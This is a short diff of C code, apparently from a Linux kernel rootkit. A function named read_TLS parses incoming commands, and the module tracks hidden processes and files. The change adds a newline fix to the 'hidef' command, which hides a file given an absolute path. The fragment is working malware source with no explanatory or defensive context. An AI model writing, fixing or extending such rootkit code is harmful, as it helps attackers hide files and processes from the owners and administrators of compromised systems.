@@ -382,6 +382,8 @@ void read_TLS(struct work_struct* work) {
         hidden_kill_procs[hidden_kill_count++] = tmp_port;
     //Hiding a file given an absolute path
     } else if (memcmp("hidef", buffer, 5) == 0) {
+        //Zero out newline char
+        buffer[len - 1] = '\0';
         if (hide_file(buffer + 6, hidden_files + hidden_file_count)) {
             ++hidden_file_count;
         } else {
